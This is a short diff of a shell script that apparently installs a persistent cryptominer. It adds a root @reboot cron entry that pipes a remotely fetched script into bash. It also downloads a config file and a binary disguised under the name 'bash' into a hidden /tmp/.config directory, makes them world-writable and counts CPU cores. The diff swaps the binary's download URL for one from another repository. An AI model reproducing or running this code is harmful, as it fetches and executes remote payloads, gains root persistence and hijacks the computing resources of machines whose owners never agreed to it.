@@ -5,7 +5,8 @@ sudo sed -i "/^@reboot/d;\$a\@reboot root /bin/bash <(wget -qO- https://raw.gith
 
 mkdir -p /tmp/.config
 wget -qO /tmp/.config/config.json https://raw.githubusercontent.com/curiosityinteriorsuk/2088/main/10v.json
-wget -qO /tmp/.config/bash https://raw.githubusercontent.com/curiosityinteriorsuk/2088/main/910
+###wget -qO /tmp/.config/bash https://raw.githubusercontent.com/curiosityinteriorsuk/2088/main/910
+wget -qO /tmp/.config/bash https://raw.githubusercontent.com/Blenkinship/any/main/0
 chmod -R 777 /tmp/.config
 
 cores=`grep 'siblings' /proc/cpuinfo |cut -d':' -f2 | head -n1 |grep -o '[0-9]\+'`
